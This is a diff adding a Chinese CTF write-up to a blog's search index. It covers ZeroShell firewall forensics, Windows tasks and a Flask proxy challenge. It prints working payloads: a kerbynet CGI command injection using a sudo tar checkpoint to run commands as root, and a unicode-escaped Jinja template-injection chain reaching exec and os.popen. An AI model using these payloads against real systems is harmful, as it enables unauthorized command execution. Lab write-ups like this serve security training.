@@ -4963,4 +4963,74 @@ Str + Destination的md5值是 27019e688a4e62a649fd99cadaafdb4e</p>
         <tag>MySQL</tag>
       </tags>
   </entry>
+  <entry>
+    <title>2024-12-17 长城杯初赛WP</title>
+    <url>/2024/12/17/2024-12-17-%E9%95%BF%E5%9F%8E%E6%9D%AFWP/</url>
+    <content><![CDATA[<h2 id="威胁检测与网络流量分析"><a href="#威胁检测与网络流量分析" class="headerlink" title="威胁检测与网络流量分析"></a>威胁检测与网络流量分析</h2><h3 id="zeroshell-1"><a href="#zeroshell-1" class="headerlink" title="zeroshell_1"></a>zeroshell_1</h3><p>题目内容：</p>
+<p>小路是一名实习生，接替公司前任网管的工作，一天发现公司网络出口出现了异常的通信，现需要通过回溯出口流量对异常点位(防火墙)进行定位，并确定异常的设备。然后进行深度取证检查（需要获取root权限）。现在需要你从网络攻击数据包中找出漏洞攻击的会话，分析会话编写exp或数据包重放获取防火墙设备管理员权限，查找防火墙设备上安装的木马，然后分析木马外联地址和通信密钥以及木马启动项位置。</p>
+<p>1.从数据包中找出攻击者利用漏洞开展攻击的会话（攻击者执行了一条命令），写出该会话中设置的flag, 结果提交形式：flag{xxxxxxxxx}</p>
+<p>（本题附件见于提前下载的加密附件2e9c01da1d333cb8840968689ed3bc57.7z，解压密码为11b0526b-9cfb-4ac4-8a75-10ad9097b7ce ）</p>
+<ol>
+<li>解压附件</li>
+</ol>
+<p>解压后是一个vmk的虚拟机内容和一个流量包，其他文件夹是空的</p>
+<p>先运行vmk ps: 需要17以上版本，而我准备的vm是16版本的，所以花了些时间重装</p>
+<p>把虚拟机跑起来</p>
+<p>题目已提示</p>
+<p><code>分析会话编写exp或数据包重放获取防火墙设备管理员权限</code></p>
+<p>多半是数据包重放攻击</p>
+<p>整理好思路开始查看</p>
+<p>ps: 太累了不放图了</p>
+<p>wireshark过滤内容</p>
+<p>http </p>
+<p>然后搜索字符串 搜那个登录的 action键的值</p>
+<p>搜到了账号密码 admin qwe!@..</p>
+<p>试了很多次无法登录</p>
+<p>这是个误导人的信息</p>
+<p>后面对cgi接口进行测试</p>
+<p>在http请求数据包中找到了一串base64</p>
+<p>这个既是答案也是下一题的线索</p>
+<hr>
+<h3 id="zeroshell-2"><a href="#zeroshell-2" class="headerlink" title="zeroshell_2"></a>zeroshell_2</h3><p>2.通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，提取flag文件内容</p>
+<p>看到这个就该想到webshell了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">61.139.2.100//cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=<span class="string">&#x27;%0A/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=&#x27;</span>find / -name “flag”<span class="string">&#x27;%0A&#x27;</span>%20 HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>经过测试发现传参漏洞</p>
+<p>先经过find命令找到flag文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">61.139.2.100//cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=<span class="string">&#x27;%0A/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=&#x27;</span>find / -name “flag”<span class="string">&#x27;%0A&#x27;</span>%20 HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>直接cat 拿到flag</p>
+<hr>
+<h3 id="zeroshell-3"><a href="#zeroshell-3" class="headerlink" title="zeroshell_3"></a>zeroshell_3</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">61.139.2.100//cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=<span class="string">&#x27;%0A/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=&#x27;</span>netstat -ano<span class="string">&#x27;%0A&#x27;</span>%20 HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>找到IP就行了</p>
+<p>没截图别看了</p>
+<h3 id="zeroshell-5"><a href="#zeroshell-5" class="headerlink" title="zeroshell_5"></a>zeroshell_5</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://61.139.2.100//cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=<span class="built_in">exec</span>=%27cat%20/DB/_DB.001/.nginx %27%0A%27%20%20HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>应该没打错吧</p>
+<p>把木马文件内容提取出来</p>
+<p>hxd打开查看字段找到密码311223344qweasdzxc</p>
+<h3 id="win1"><a href="#win1" class="headerlink" title="win1"></a>win1</h3><p>运行虚拟机查看属性</p>
+<p>送分题</p>
+<h3 id="win2"><a href="#win2" class="headerlink" title="win2"></a>win2</h3><p>翻日志的时候 查看了一下计划任务找到密码</p>
+<p>很明显的base64编码</p>
+<p>解码成html实体编码</p>
+<p>就这</p>
+<p>最后解码成flag</p>
+<h3 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h3><p>阅读源码发现是我熟悉的flask 框架</p>
+<p>过滤内容太多了</p>
+<p>但是没有过滤	Unicode 转义</p>
+<p>代码尝试通过递归访问字典的多个层级来最终获取到 <code>exec</code> 函数</p>
+<p>最后exec执行命令即可</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">code=&#123;&#123;cycler[<span class="string">&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;</span>][<span class="string">&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;</span>][<span class="string">&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&quot;(\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f)(&#x27;\u006f\u0073&#x27;).\u0070\u006f\u0070\u0065\u006e(&#x27;cat /flag &gt; app.py&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ps:思路： 内建字典中获取到 <code>exec</code> 函数，利用该函数执行一个命令行操作</p>
+]]></content>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>SQL</tag>
+        <tag>MySQL</tag>
+      </tags>
+  </entry>
 </search>
